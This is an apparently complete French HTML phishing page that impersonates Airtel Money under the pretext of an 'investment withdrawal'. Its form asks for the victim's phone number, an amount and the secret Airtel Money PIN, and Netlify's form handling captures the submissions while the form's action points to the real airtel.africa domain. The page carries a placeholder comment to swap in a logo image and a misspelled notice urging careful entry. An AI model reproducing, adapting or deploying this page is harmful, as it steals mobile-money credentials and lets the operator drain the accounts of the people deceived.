<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Retrait d'investissement — Airtel Money</title>
  <style>
    * { box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
    html,body { height:100%; margin:0; background: linear-gradient(180deg,#f2f6fb 0%, #ffffff 100%); color:#222; }

    .wrap {
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }

    .card {
      width:100%;
      max-width:520px;
      background: #fff;
      border-radius:12px;
      box-shadow: 0 8px 30px rgba(18,30,60,0.08);
      overflow: hidden;
      border: 1px solid rgba(0,0,0,0.03);
    }

    .hero {
      width:100%;
      height:120px;
      display:flex;
      align-items:center;
      justify-content:center;
      background: #fff;
    }
    .hero img {
      max-height:90px;
      object-fit:contain;
    }

    .card-body {
      padding:22px;
    }
    h1 { font-size:20px; margin:0 0 12px 0; }
    p.lead { margin:0 0 18px 0; color:#555; font-size:14px; }

    form { display:block; }
    .field { margin-bottom:14px; }

    label {
      display:block;
      font-size:13px;
      margin-bottom:6px;
      color:#333;
    }

    input[type="text"], input[type="tel"], input[type="number"], input[type="password"] {
      width:100%;
      padding:10px 12px;
      border-radius:8px;
      border:1px solid #e3e8ef;
      background:#fbfdff;
      font-size:15px;
      outline:none;
      transition: box-shadow .12s, border-color .12s;
    }
    input:focus { border-color:#9bb7ff; box-shadow:0 6px 20px rgba(59,89,210,0.06); }

    .hint {
      font-size:12px;
      color:#7a7f86;
      margin-top:6px;
    }

    .notice {
      background:#fff9e6;
      border-left:4px solid #ffd166;
      padding:10px 12px;
      border-radius:6px;
      font-size:13px;
      color:#6b4b00;
      margin-top:8px;
    }

    .btn {
      width:100%;
      padding:12px;
      margin-top:8px;
      border-radius:10px;
      border:0;
      font-weight:600;
      font-size:15px;
      cursor:pointer;
      background: linear-gradient(90deg,#e53935,#ff6b6b);
      color:#fff;
      box-shadow: 0 8px 20px rgba(229,57,53,0.18);
    }

    .small {
      font-size:12px;
      color:#666;
      text-align:center;
      margin-top:12px;
    }

    .hidden { display:none; }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      
      <div class="hero">
        <!-- Remplace ici l'image -->
        <img src= "IMG_9605.PNG" alt="Airtel Money">
      </div>

      <div class="card-body">
        <h1>Retrait d'investissement — Airtel Money</h1>
        <p class="lead">Remplissez les informations ci-dessous pour initier le retrait.</p>

        <form name="retrait-airtel-money"
              method="POST"
              data-netlify="true"
              action="https://www.airtel.africa"
              netlify-honeypot="bot-field"
              autocomplete="on">

          <input type="hidden" name="form-name" value="retrait-airtel-money">

          <div class="hidden">
            <label>Ne pas remplir : <input name="bot-field"></label>
          </div>

          <div class="field">
            <label for="am-number">Numéro Airtel Money</label>
            <input id="am-number" name="numero_airtel" type="tel"
                   placeholder="Votre Numero de telephone" required>
          </div>

          <div class="field">
            <label for="amount">Montant à recevoir</label>
            <input id="amount" name="montant" type="number" min="1" step="0.01"
                   placeholder="Ex:1000" required>
          </div>

          <div class="field">
            <label for="am-code">Code Airtel Money</label>
            <input id="am-code" name="code_airtel" type="password" required
                   placeholder="••••••">

            <div class="notice">
              <strong>Noté :</strong> Remplisez Correctement vos infos pour eviter les erreus .
            </div>
          </div>

          <button type="submit" class="btn">Recevoir</button>


        </form>
      </div>
    </div>
  </div>
</body>
</html>
